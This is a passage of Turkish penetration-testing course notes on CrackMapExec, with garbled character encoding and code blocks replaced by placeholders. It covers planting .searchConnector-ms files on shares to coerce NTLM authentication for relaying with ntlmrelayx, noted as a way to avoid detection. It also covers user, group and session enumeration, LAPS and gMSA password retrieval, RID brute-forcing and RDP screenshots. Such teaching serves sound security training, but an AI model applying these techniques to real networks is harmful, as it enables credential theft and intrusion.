Bu bÃ¶lÃ¼mÃ¼ tamamlamadan Ã¶nce, **LNK** dÄ±ÅŸÄ±nda baÅŸka bir dosya formatÄ± kullanarak kimlik doÄŸrulamasÄ±nÄ± zorlamanÄ±n baÅŸka bir yÃ¶ntemine bakalÄ±m: **[.searchConnector-ms](https://learn.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry)** ve **`.library-ms`** formatlarÄ±. Bu dosya formatlarÄ±nÄ±n Ã§oÄŸu Windows sÃ¼rÃ¼mÃ¼nde **varsayÄ±lan dosya iliÅŸkilendirmeleri** bulunur. Windows ile entegre Ã§alÄ±ÅŸarak iÃ§eriÄŸi rastgele bir konumdan, hatta **`WebDAV` paylaÅŸÄ±mÄ±yla belirtilen remote bir konumdan** gÃ¶sterebilirler.

Ã–zetle, bu dosyalar **LNK** dosyasÄ±yla aynÄ± iÅŸlevi gÃ¶rÃ¼r. Bu yÃ¶ntemin keÅŸfi hakkÄ±nda daha fazla bilgi edinmek iÃ§in **"[Exploring search connectors and library files in Windows](https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/)"** baÅŸlÄ±klÄ± blog yazÄ±sÄ±nÄ± okuyabiliriz.

CrackMapExec, **`drop-sc`** adÄ±nda bir modÃ¼le sahiptir. Bu modÃ¼l, paylaÅŸÄ±lan bir klasÃ¶rde **`searchConnector-ms`** dosyasÄ± oluÅŸturmamÄ±za olanak tanÄ±r. Kullanabilmek iÃ§in **URL** seÃ§eneÄŸini belirterek **SMB fake sunucumuzu** hedef gÃ¶stermemiz gerekir. Bu durumda, **`ntlmrelayx`** Ã§alÄ±ÅŸtÄ±ran hostumuz olacaktÄ±r. **URL** deÄŸeri Ã§ift ters eÄŸik Ã§izgi (`\`) ile kaÃ§Ä±rÄ±lmalÄ±dÄ±r. Ã–rneÄŸin: **`URL=\\10.10.14.33\secret`**.

Ä°steÄŸe baÄŸlÄ± olarak aÅŸaÄŸÄ±daki seÃ§enekleri belirleyebiliriz:

* `SHARE=name` seÃ§eneÄŸi ile hedef paylaÅŸÄ±mlÄ± klasÃ¶r . Bu seÃ§eneÄŸi belirtmezsek, dosyayÄ± `WRITE` izinlerine sahip tÃ¼m paylaÅŸÄ±mlara yazacaktÄ±r

* `FILENAME=name` seÃ§eneÄŸi ile dosya adÄ± . Bu seÃ§eneÄŸi belirtmezsek, â€œ`Documents`â€ adÄ±nda bir dosya oluÅŸturacaktÄ±r.

* OluÅŸturduÄŸumuz dosyalarÄ± temizlemek istiyorsak `CLEANUP=True` seÃ§eneÄŸi. EÄŸer Ã¶zel bir isim kullanacaksak filename seÃ§eneÄŸini belirtmemiz gerekiyor.

Drop-sc'yi iÅŸ baÅŸÄ±nda gÃ¶relim:

### Dropping a searchConnector-ms File

{{CODE_BLOCK_122}}

{{CODE_BLOCK_123}}

Bir kullanÄ±cÄ± **paylaÅŸÄ±lan klasÃ¶re** eriÅŸtiÄŸinde ve **ntlmrelayx** dinleme modunda Ã§alÄ±ÅŸÄ±rken, kimlik bilgilerini **hedef makineye yÃ¶nlendirebilmemiz** gerekir.

### NTLMRelayx ve drop-sc Kullanarak YÃ¶nlendirme

{{CODE_BLOCK_124}}

Son olarak, `CLEANUP=True` seÃ§eneÄŸi ile `.searchConnector-ms` dosyasÄ±nÄ± temizleyebiliriz:


### searchConnector-ms DosyalarÄ±nÄ± Temizleme

{{CODE_BLOCK_125}}


LNK dosyalarÄ± genellikle bu tÃ¼r saldÄ±rÄ±lar iÃ§in bilinir. `.searchConnector-ms` gibi baÅŸka bir dosya tÃ¼rÃ¼ kullanmak, fark edilmemenize yardÄ±mcÄ± olabilir.

Sonraki bÃ¶lÃ¼mlerde CrackMapExec'in keÅŸif seÃ§eneklerini inceleyeceÄŸiz.

---


### SMB ile Mapping ve Enumeration

CrackMapExec, geÃ§erli bir domain kullanÄ±cÄ± hesabÄ±yla numaralandÄ±rma sÃ¶z konusu olduÄŸunda Ã§ok daha fazla seÃ§enekle birlikte gelir. En Ã§ok kullanÄ±lan seÃ§enekleri ele aldÄ±k, ancak daha derine inelim. Ä°ÅŸte ayrÄ±calÄ±klÄ± olmasa bile geÃ§erli bir hesap aldÄ±ÄŸÄ±mÄ±zda kullanabileceÄŸimiz tÃ¼m seÃ§eneklerin listesi:

| Komut                                                                 | AÃ§Ä±klama                                                          |
| --------------------------------------------------------------------- | ----------------------------------------------------------------- |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --loggedon-users` | Hedefte oturum aÃ§mÄ±ÅŸ kullanÄ±cÄ±larÄ± listeler.                      |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --sessions`       | Hedefteki aktif oturumlarÄ± listeler.                              |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --disks`          | Hedefteki diskleri listeler.                                      |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --computers`      | Hedef aÄŸdaki bilgisayarlarÄ± listeler.                             |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --wmi`            | Belirtilen WMI sorgusunu Ã§alÄ±ÅŸtÄ±rÄ±r.                              |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --wmi-namespace`  | WMI Namespaceâ€™ini belirtir (varsayÄ±lan: `root\cimv2`).            |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --rid-brute`      | Hedef Ã¼zerinde RID brute-force yÃ¶ntemiyle kullanÄ±cÄ±larÄ± listeler. |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --local-groups`   | Local gruplarÄ± listeler; grup belirtilirse Ã¼yelerini listeler.    |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --shares`         | Hedefteki tÃ¼m paylaÅŸÄ±m izinlerini listeler.                       |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --users`          | Hedefteki domain kullanÄ±cÄ±larÄ±nÄ± listeler.                        |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --groups`         | Hedefteki domain gruplarÄ±nÄ± listeler.                             |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --pass-pol`       | Domainin password policy'sini gÃ¶sterir.                           |

Daha Ã¶nce Ã§alÄ±ÅŸmamÄ±ÅŸ olanlarÄ± gÃ¶zden geÃ§irelim:

### Hedefteki aktif oturumlarÄ± / oturum aÃ§mÄ±ÅŸ kullanÄ±cÄ±larÄ± numaralandÄ±rma

Birden fazla hedefi ele geÃ§irmiÅŸsek, aktif oturumlarÄ± kontrol etmek faydalÄ± olabilir, belki bir domain administrator vardÄ±r ve bu belirli hedefe odaklanmamÄ±z gerekebilir. Bir bilgisayardaki kullanÄ±cÄ±larÄ± tespit etmek iÃ§in `--sessions` ve `--loggedon-users` seÃ§eneklerini kullanabiliriz. Session'lar, kullanÄ±cÄ±nÄ±n hedef makinede giriÅŸ yapmÄ±yor olsa da kullanÄ±cÄ± kimlik bilgileriyle oturum aÃ§Ä±ldÄ±ÄŸÄ± anlamÄ±na gelir. GiriÅŸ yapmÄ±ÅŸ kullanÄ±cÄ±lar ise kendiliÄŸinden anlaÅŸÄ±lÄ±r; bir kullanÄ±cÄ±nÄ±n hedef makineye giriÅŸ yapmÄ±ÅŸ olduÄŸunu ifade eder. `BloodHound`, aktif oturumlarÄ± bulmak iÃ§in kullanabileceÄŸimiz bir diÄŸer araÃ§tÄ±r.


### Sessions ve loggendon-users seÃ§eneklerini kullanma

{{CODE_BLOCK_126}}

Belirli bir kullanÄ±cÄ±yÄ± arÄ±yorsak, -`-loggedon-users-filter` seÃ§eneÄŸini ve ardÄ±ndan aradÄ±ÄŸÄ±mÄ±z kullanÄ±cÄ±nÄ±n adÄ±nÄ± kullanabiliriz. Birden fazla kullanÄ±cÄ± arÄ±yorsak, `regex`'i de destekler.


### Oturum aÃ§mÄ±ÅŸ kullanÄ±cÄ±larla filtre seÃ§eneÄŸini kullanma

{{CODE_BLOCK_127}}

Not: Genellikle, `--loggedon-users` veya `--sessions` parametrelerinin baÅŸarÄ±lÄ± bir ÅŸekilde Ã§alÄ±ÅŸtÄ±rÄ±labilmesi iÃ§in administrator izinleri gereklidir.



### Enumerate Computers

CME ayrÄ±ca domain bilgisayarlarÄ±nÄ± da listeleyebilir ve bunu bir LDAP isteÄŸi gerÃ§ekleÅŸtirerek yapar

### Domain'deki BilgisayarlarÄ± NumaralandÄ±rma

{{CODE_BLOCK_128}}


Not: Bu seÃ§enek yalnÄ±zca SMB protokolÃ¼nde mevcut olsa da, CME bir LDAP sorgusu yapmaktadÄ±r.


### Enumerate LAPS

Local Administrator Password Solution (LAPS), domain'e baÄŸlÄ± bilgisayarlarÄ±n local hesap parolalarÄ±nÄ±n yÃ¶netimini saÄŸlar. Parolalar Active Directory'de (AD) saklanÄ±r ve ACL tarafÄ±ndan korunur, bÃ¶ylece yalnÄ±zca uygun kullanÄ±cÄ±lar bunlarÄ± okuyabilir veya sÄ±fÄ±rlama talebinde bulunabilir. LAPS domain iÃ§inde kullanÄ±lÄ±yorsa ve LAPS ÅŸifrelerini okuyabilen bir hesabÄ± tehlikeye atarsak, `--laps` seÃ§eneÄŸini bir hedef listesi ile kullanabilir ve komutlarÄ± Ã§alÄ±ÅŸtÄ±rabilir veya `--sam` gibi diÄŸer seÃ§enekleri kullanabiliriz.


{{CODE_BLOCK_129}}

Not: EÄŸer varsayÄ±lan administrator hesap adÄ± "`administrator`" deÄŸilse, -`-laps username` seÃ§eneÄŸinden sonra kullanÄ±cÄ± adÄ±nÄ± ekleyin.

### Hedefteki RID'yi Brute-forcing yaparak KullanÄ±cÄ±larÄ± NumaralandÄ±r --rid-brute

Nadiren kullanÄ±lan bir Ã¶zellik, kullanÄ±cÄ± listeleri oluÅŸturmak iÃ§in `RID Bruteforce`'dur. `BloodHound` veya `PowerView` ile bir kullanÄ±cÄ± listesi oluÅŸturabiliriz. Ancak, bu teknikler muhtemelen yakalanacak ve kurulumu biraz zaman alacaktÄ±r. CrackMapExec'in `--rid-brute` seÃ§eneÄŸini kullanarak, UserID'sini brute forcing yaparak bir kullanÄ±cÄ± listesi toplamak mÃ¼mkÃ¼ndÃ¼r.


### List Local Users

{{CODE_BLOCK_130}}

VarsayÄ±lan olarak, `--rid-brute 4000`'e kadar RID'leri zorlayarak objeleri numaralandÄ±rÄ±r. DavranÄ±ÅŸÄ±nÄ± `--rid-brute [MAX_RID]` kullanarak deÄŸiÅŸtirebiliriz.

`--rid-brute` seÃ§eneÄŸi, brute ile zorlanan kimliklerle eÅŸleÅŸen kullanÄ±cÄ± adlarÄ±nÄ± ve diÄŸer Active Directory objeleri almak iÃ§in kullanÄ±labilir. `NULL Authentication` etkinleÅŸtirilmiÅŸse domain hesaplarÄ±nÄ± numaralandÄ±rmak iÃ§in de kullanÄ±labilir. Bu seÃ§eneÄŸin bu ÅŸekillerde kullanÄ±labileceÄŸini unutmamak Ã¶nemlidir.

### Enumerate Disks

Bazen kontrol etmeyi hatÄ±rlamamÄ±z gereken Ã¶nemli bir parÃ§a, bir sunucuda bulunabilecek ek disklerdir. CrackMapExec, sunucuda var olan diskleri kontrol etmemizi saÄŸlayan bir `--disks` seÃ§eneÄŸine sahiptir.

### Enumerating Disks

{{CODE_BLOCK_131}}


### Local ve Domain GruplarÄ±nÄ± NumaralandÄ±rma

Local-groups ile local gruplarÄ± veya `--groups` ile domain gruplarÄ±nÄ± listeleyebiliriz.

### Enumerating Local Groups

{{CODE_BLOCK_132}}

### Enumerating Domain Groups

{{CODE_BLOCK_133}}


EÄŸer grup Ã¼yelerini almak istiyorsak, `--groups [GRUP ADI]` kullanabiliriz.


### Group **Members**

{{CODE_BLOCK_134}}

Not: YazÄ±m sÄ±rasÄ±nda `--local-group` yalnÄ±zca bir Domain Controller'a karÅŸÄ± Ã§alÄ±ÅŸÄ±r ve grup adÄ±nÄ± kullanarak bir grubu sorgulamak iÅŸe yaramaz.


### WMI Sorgulama

[Windows Management Instrumentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (WMI), Windows iÅŸletim sistemlerinde administrative iÅŸlemler iÃ§in kullanÄ±lÄ±r. Remote bilgisayarlardaki administrative gÃ¶revlerini otomatikleÅŸtirmek iÃ§in WMI script dosyalarÄ± veya uygulamalarÄ± yazabiliriz. WMI, iÅŸletim sisteminin diÄŸer bÃ¶lÃ¼mlerine ve System Center Operations Manager (eski adÄ±yla Microsoft Operations Manager (MOM)) veya Windows Remote Management (WinRM) gibi Ã¼rÃ¼nlere yÃ¶netim verileri saÄŸlar.

Windows Management Instrumentation'nÄ±n (WMI) birincil kullanÄ±m alanlarÄ±ndan biri, sÄ±nÄ±f (class) ve Ã¶rnek (instance) bilgileri iÃ§in WMI havuzunu sorgulama yeteneÄŸidir. Ã–rneÄŸin, WMI'dan remote veya local bir sistemden shut-down olaylarÄ±nÄ± temsil eden tÃ¼m objeleri dÃ¶ndÃ¼rmesini isteyebiliriz.

WMI, TCP port `135` ve bir dizi dinamik port kullanÄ±r: `49152-65535 (RPC dinamik portlarÄ± - Windows Vista, 2008 ve Ã¼zeri)`, TCP 1024-65535 (RPC dinamik portlarÄ± - Windows NT4, Windows 2000, Windows 2003) veya WMI'yÄ± Ã¶zel bir port aralÄ±ÄŸÄ± kullanacak ÅŸekilde ayarlayabiliriz

Ã–rneÄŸin, remote bir bilgisayarda `Sysmon` uygulamasÄ±nÄ±n Ã§alÄ±ÅŸÄ±p Ã§alÄ±ÅŸmadÄ±ÄŸÄ±nÄ± sorgulamak ve `Caption` ve `ProcessId`'yi gÃ¶rÃ¼ntÃ¼lemek iÃ§in WMI kullanalÄ±m, kullanacaÄŸÄ±mÄ±z WMI sorgusu S`ELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE '%sysmon%'` ÅŸeklindedir:


### Sysmon'un Ã‡alÄ±ÅŸÄ±p Ã‡alÄ±ÅŸmadÄ±ÄŸÄ±nÄ± Sorgulamak iÃ§in WMI Kullanma

{{CODE_BLOCK_135}}

WMI, sÄ±nÄ±flarÄ±nÄ± hiyerarÅŸik bir namespace iÃ§inde dÃ¼zenler. Bir sorgu gerÃ§ekleÅŸtirmek iÃ§in, Class Name ve bulunduÄŸu Namespace'i bilmemiz gerekir. YukarÄ±daki Ã¶rnekte, `Win32_Process` sÄ±nÄ±fÄ±nÄ± `root\cimv2` namespace'inde sorguluyoruz. Namespace'i belirtmedik Ã§Ã¼nkÃ¼ varsayÄ±lan olarak CME, `root\cimv2`'yi kullanÄ±r (bu bilgiyi --help menÃ¼sÃ¼nde gÃ¶rebiliriz).

BaÅŸka bir namespace'i sorgulamak iÃ§in onu belirtmemiz gerekir. Ã–rneÄŸin, `root\WMI` namespace'inde bulunan `MSPower_DeviceEnable` sÄ±nÄ±fÄ±nÄ± sorgulayalÄ±m. Bu sÄ±nÄ±f, sistem Ã§alÄ±ÅŸÄ±rken dinamik olarak aÃ§Ä±lÄ±p kapanmasÄ± gereken cihazlar hakkÄ±nda bilgi tutar. Belirli bir konuyla ilgili WMI sÄ±nÄ±flarÄ±nÄ±n nasÄ±l bulunacaÄŸÄ± hakkÄ±nda daha fazla bilgi edinmek iÃ§in [Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_wmi?view=powershell-5.1#finding-wmi-classes) ve [wutils.com'](https://wutils.com/wmi/)daki 3. taraf belgelerini kullanabiliriz.


### Quering root\WMI Namespace

{{CODE_BLOCK_136}}

Not: Genellikle, WMI'yÄ± sorgulamak iÃ§in administrative ayrÄ±calÄ±klarÄ±na sahip olmamÄ±z gerekir, ancak bir administrator, WMI'yÄ± sorgulamak iÃ§in administrator olmayan bir hesabÄ± yapÄ±landÄ±rabilir. Bu durumda, WMI sorgularÄ±nÄ± gerÃ§ekleÅŸtirmek iÃ§in administrator olmayan bir hesap kullanabiliriz.

WMI Sorgu Dili (WQL) hakkÄ±nda daha fazla bilgi edinmek iÃ§in [Microsoft'un Belgelerini](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wql-sql-for-wmi) okuyabiliriz.



AÅŸaÄŸÄ±daki bÃ¶lÃ¼m LDAP ve RDP protokollerini kullanarak numaralandÄ±rmayÄ± kapsayacaktÄ±r.

----


### LDAP and RDP Enumeration

Daha Ã¶nce, CrackMapExec'te en Ã§ok kullanÄ±lan protokol olan `SMB` ile bazÄ± numaralandÄ±rma seÃ§eneklerini inceledik, ancak `LDAP` ve `RDP` protokolleri ile daha fazla numaralandÄ±rma seÃ§eneÄŸi vardÄ±r

Bu bÃ¶lÃ¼mde, bu seÃ§eneklerden bazÄ±larÄ± ve hedeflerimizi nasÄ±l daha fazla numaralandÄ±rabileceÄŸimiz gÃ¶sterilecektir

### LDAP & RDP Commands

LDAP ve RDP protokolleri aÅŸaÄŸÄ±daki seÃ§enekleri iÃ§erir:

| Komut                                                                          | AÃ§Ä±klama                                                                                           |
| ------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------- |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --users`                  | Etkin Domain kullanÄ±cÄ±larÄ±nÄ± listeler.                                                             |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --groups`                 | Domain gruplarÄ±nÄ± listeler.                                                                        |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --password-notrequired`   | `PASSWORD_NOTREQD` bayraÄŸÄ± olan kullanÄ±cÄ±larÄ± listeler.                                            |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --trusted-for-delegation` | `TRUSTED_FOR_DELEGATION` bayraÄŸÄ± olan kullanÄ±cÄ± ve bilgisyalarÄ±nÄ± listeler.                        |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --admin-count`            | `adminCount=1` derecesine sahip objeleri listeler.                                                 |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --get-sid`                | Domainin SID bilgisini alÄ±r.                                                                       |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --gmsa`                   | GMSA (GruplandÄ±rÄ±lmÄ±ÅŸ YÃ¶netici Hizmet HesaplarÄ±) ÅŸifrelerini listeler.                             |
| `crackmapexec rdp <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --nla-screenshot`          | NLA (AÄŸ Seviyesinde Kimlik DoÄŸrulamasÄ±) devre dÄ±ÅŸÄ± ise RDP giriÅŸ ekranÄ±nÄ±n ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ alÄ±r. |
| `crackmapexec rdp <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --screenshot`              | BaÄŸlantÄ± baÅŸarÄ±lÄ±ysa RDP oturumunun ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ alÄ±r.                                        |
| `crackmapexec rdp <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --screentime`              | MasaÃ¼stÃ¼ gÃ¶rÃ¼ntÃ¼sÃ¼ iÃ§in bekleme sÃ¼resini belirtir.                                                 |
| `crackmapexec rdp <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --res RES`                 | Ã‡Ã¶zÃ¼nÃ¼rlÃ¼k belirler (Ã¶rnek format: WIDTHxHEIGHT, varsayÄ±lan: 1024x768).                            |

HenÃ¼z Ã§alÄ±ÅŸmadÄ±klarÄ±mÄ±z varsa onlarÄ± gÃ¶zden geÃ§irelim.

### Enumerating Users and Groups

SMB protokolÃ¼nde yaptÄ±ÄŸÄ±mÄ±z gibi, `LDAP` ile de kullanÄ±cÄ±larÄ± ve gruplarÄ± listeleyebiliriz:

### Enumerating Users and Groups

{{CODE_BLOCK_137}}

Not: Domain FQDN'sini Ã§Ã¶zÃ¼mleyemezsek LDAP protokol iletiÅŸimlerinin Ã§alÄ±ÅŸmayacaÄŸÄ±nÄ± unutmayÄ±n. Domain DNS sunucularÄ±na baÄŸlanmÄ±yorsak, FQDN'yi `/etc/hosts` dosyasÄ±nda yapÄ±landÄ±rmamÄ±z gerekir


### Ä°lginÃ§ Hesap Ã–zelliklerini NumaralandÄ±rma

`ldap` protokolÃ¼, `PASSWD_NOTREQD` veya `TRUSTED_FOR_DELEGATION` bayraÄŸÄ± ile hesaplarÄ± tanÄ±mlamamÄ±za yardÄ±mcÄ± olacak birkaÃ§ seÃ§eneÄŸe daha sahiptir ve hatta `adminCount` deÄŸeri `1` olan tÃ¼m hesaplarÄ± sorgulayabiliriz.

`PASSWD_NOTREQD` hesap denetimi attribute ayarlanmÄ±ÅŸsa, kullanÄ±cÄ± geÃ§erli password policy uzunluÄŸuna tabi deÄŸildir, yani daha kÄ±sa bir parolaya sahip olabilir veya hiÃ§ parola kullanmayabilir (domain'de boÅŸ parolalara izin veriliyorsa). Bu hesaplarÄ± tanÄ±mlamak iÃ§in  `--password-notrequired` seÃ§eneÄŸini kullanabiliriz.


### PASSWD_NOTREQD Attribute TanÄ±mlanmasÄ±

{{CODE_BLOCK_138}}

`TRUSTED_FOR_DELEGATION` attribute ayarlanÄ±rsa, bir servisin altÄ±nda Ã§alÄ±ÅŸtÄ±ÄŸÄ± servis hesabÄ± (kullanÄ±cÄ± veya bilgisayar) Kerberos yetkilendirmesi iÃ§in gÃ¼venilirdir, yani servisi talep eden bir client'i taklit edebilir. Bu saldÄ±rÄ± tÃ¼rÃ¼ne `Kerberos Unconstrained Delegation` adÄ± verilir. Bu konu hakkÄ±nda daha fazla bilgi edinmek iÃ§in bu [blog](https://adsecurity.org/?p=1667) yazÄ±sÄ±nÄ± okuyabilirsiniz.

### Unconstrained Delegation Belirlenmesi

{{CODE_BLOCK_139}}

`AdminCount` attribute, SDProp process'in bir kullanÄ±cÄ±yÄ± koruyup korumadÄ±ÄŸÄ±nÄ± belirler. Bu process'te, Active Directory'deki `AdminSDHolder`, korunan user account'lar iÃ§in ACL permissions'Ä±n bir template'i olarak gÃ¶rev yapar. EÄŸer herhangi bir account ACE'si (Ã¶rneÄŸin, bir attacker tarafÄ±ndan) modified edilirse, bu process tarafÄ±ndan korunan account'larÄ±n ACL permissions'Ä±, `SDProp` process her Ã§alÄ±ÅŸtÄ±ÄŸÄ±nda (default olarak her 60 dakikada bir Ã§alÄ±ÅŸÄ±r, ancak bu sÃ¼re modified edilebilir) templated permission set'e resetlenir. User, adminCount deÄŸeri 0 olarak set edilmiÅŸse veya specified deÄŸilse bu koruma kapsamÄ±na girmez. EÄŸer attribute value 1 olarak set edilmiÅŸse, user korunur. Attacker'lar genellikle internal environment'ta adminCount attribute'i 1 olan account'larÄ± target olarak arar. Bunlar genellikle privileged account'lardÄ±r ve further access veya full domain compromise ile sonuÃ§lanabilir.


### adminCount Attribute'u Sorgulama

{{CODE_BLOCK_140}}


### Domain SID'sini numaralandÄ±rma

BazÄ± domain attack'larÄ±, bir user veya domain SID gibi belirli domain bilgilerini elde etmemizi gerektirir. SID (Security IDentifier), bir computer veya domain controller'Ä±n sizi tanÄ±mlamak iÃ§in kullandÄ±ÄŸÄ± `unique bir ID` numarasÄ±dÄ±r. Domain SID ise domain'i tanÄ±mlayan unique bir ID numarasÄ±dÄ±r. CrackMapExec kullanarak domain SID'i elde etmek iÃ§in `--get-sid` flag'ini kullanabiliriz:

### Domain SID'i Toplama

{{CODE_BLOCK_141}}


### Group Managed Service Accounts (gMSA)

BaÄŸÄ±msÄ±z YÃ¶netilen Hizmet HesabÄ± (standalone Managed Service Account) (sMSA), aÅŸaÄŸÄ±dakileri saÄŸlayan yÃ¶netilen bir domain hesabÄ±dÄ±r:

* Otomatik parola yÃ¶netimi.
* BasitleÅŸtirilmiÅŸ service principal name (SPN) yÃ¶netimi.
* YÃ¶netimi diÄŸer yÃ¶neticilere devretme yeteneÄŸi

Bu yÃ¶netilen servis hesabÄ± (MSA) tÃ¼rÃ¼ Windows Server 2008 R2 ve Windows 7'de tanÄ±tÄ±lmÄ±ÅŸtÄ±r.

Group Managed Service Account (gMSA) domain iÃ§inde aynÄ± iÅŸlevselliÄŸi saÄŸlar ancak aynÄ± zamanda bu iÅŸlevselliÄŸi birden fazla sunucuya geniÅŸletir.

Bir gMSA hesabÄ±nÄ±n parolasÄ±nÄ± okuma ayrÄ±calÄ±klarÄ±na sahip bir hesabÄ± belirlemek iÃ§in PowerShell'i kullanabiliriz (komut yÃ¼rÃ¼tmeyi bir sonraki bÃ¶lÃ¼mde daha ayrÄ±ntÄ±lÄ± olarak ele alacaÄŸÄ±z):

### Enumerating Accounts with gMSA Privileges

{{CODE_BLOCK_142}}


YukarÄ±daki Ã¶rnekte, `engels` kullanÄ±cÄ±sÄ±nÄ±n `PrincipalsAllowedToRetrieveManagedPassword` ayrÄ±calÄ±ÄŸÄ±na sahip olduÄŸunu gÃ¶rebiliriz, bu da `svc_inlaneadm$` gMSA hesabÄ±nÄ±n parolasÄ±nÄ± okuyabileceÄŸi anlamÄ±na gelir. gMSA parolasÄ±nÄ± okuma hakkÄ±na sahip bir hesabÄ± tehlikeye atarsak, hesabÄ±n `NTLM` parola hash'ini almak iÃ§in `--gmsa` seÃ§eneÄŸini kullanabiliriz.


### gMSA ParolasÄ±nÄ± Edinme

{{CODE_BLOCK_143}}

Bu kimlik bilgilerini kullanmak iÃ§in, hash'ler iÃ§in -H seÃ§eneÄŸini kullanabiliriz.

### svc_inlaneadm$ HesabÄ± ile PaylaÅŸÄ±lan KlasÃ¶rleri Ä°nceleme

{{CODE_BLOCK_144}}


---

### RDP Screenshots

RDP protokolÃ¼ aracÄ±lÄ±ÄŸÄ±yla kullanÄ±cÄ± adlarÄ±nÄ± numaralandÄ±rmak iÃ§in CrackMapExec'i kullanabiliriz. Hedef makinede RDP'ye yalnÄ±zca `NLA` ile izin verme seÃ§eneÄŸi devre dÄ±ÅŸÄ± bÄ±rakÄ±lmÄ±ÅŸsa, oturum aÃ§ma isteminin ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ almak iÃ§in `--nlascreenshot` seÃ§eneÄŸini kullanabiliriz


### Enumerate Login Prompt

{{CODE_BLOCK_145}}

Ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ aÃ§mak iÃ§in MATE'in Eye'Ä±nÄ± veya CLI'dan eom'u kullanabiliriz.


### Ekran GÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ AÃ§mak iÃ§in MATE'in Eye Kullanma

{{CODE_BLOCK_146}}

![Pasted image 20241202231735.png](/img/user/resimler/Pasted%20image%2020241202231735.png)

EÄŸer bir kullanÄ±cÄ± adÄ± ve parolamÄ±z varsa, `--screenshot` seÃ§eneÄŸi ile RDP protokolÃ¼nÃ¼ kullanarak da ekran gÃ¶rÃ¼ntÃ¼sÃ¼ alabiliriz. Bu seÃ§enek `--screentime` ile birleÅŸtirilebilir, varsayÄ±lan olarak `10`, RDP baÄŸlantÄ±sÄ± aÃ§Ä±ldÄ±ktan sonra ekran gÃ¶rÃ¼ntÃ¼sÃ¼ almak iÃ§in bekleyeceÄŸi sÃ¼redir. Bu, bir hedef makineye baÄŸlandÄ±ÄŸÄ±mÄ±zda ve hedefin masaÃ¼stÃ¼nÃ¼ yÃ¼klemesi 10 saniyeden fazla sÃ¼rdÃ¼ÄŸÃ¼nde kullanÄ±ÅŸlÄ±dÄ±r.

Ekran gÃ¶rÃ¼ntÃ¼sÃ¼ seÃ§eneÄŸiyle birleÅŸtirilebilecek bir diÄŸer seÃ§enek de RDP baÄŸlantÄ±sÄ± sÄ±rasÄ±ndaki ekran Ã§Ã¶zÃ¼nÃ¼rlÃ¼ÄŸÃ¼ne karÅŸÄ±lÄ±k gelen `--res` seÃ§eneÄŸidir. Bu seÃ§enek yararlÄ±dÄ±r Ã§Ã¼nkÃ¼ aktif bir RDP oturumu bulursak, kullanÄ±cÄ±nÄ±n ekranÄ±nÄ±n boyutuna baÄŸlÄ± olarak tÃ¼m iÃ§eriÄŸi gÃ¶rebiliriz veya gÃ¶remeyiz. VarsayÄ±lan olarak bu seÃ§enek `1024x768` olarak ayarlanmÄ±ÅŸtÄ±r


### Screenshot Alma

{{CODE_BLOCK_147}}


Not: `--screentime` ve `--res` isteÄŸe baÄŸlÄ± bayraklardÄ±r.

Son olarak, ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ aÃ§mak iÃ§in MATE'in Eye'Ä±nÄ± veya CLI'dan eom'u kullanabiliriz:


### Ekran GÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ AÃ§mak iÃ§in MATE'in GÃ¶zÃ¼nÃ¼ Kullanma

{{CODE_BLOCK_148}}

![Pasted image 20241202232523.png](/img/user/resimler/Pasted%20image%2020241202232523.png)

Bu bÃ¶lÃ¼mde, hedeflerimize ulaÅŸmamÄ±za yardÄ±mcÄ± olabilecek LDAP ve RDP kullanarak Ã§eÅŸitli numaralandÄ±rma seÃ§eneklerini inceledik. AÅŸaÄŸÄ±daki bÃ¶lÃ¼m, CrackMapExec kullanarak komutlarÄ±n nasÄ±l Ã§alÄ±ÅŸtÄ±rÄ±lacaÄŸÄ±nÄ± gÃ¶zden geÃ§irecektir.


---

### Command Execution

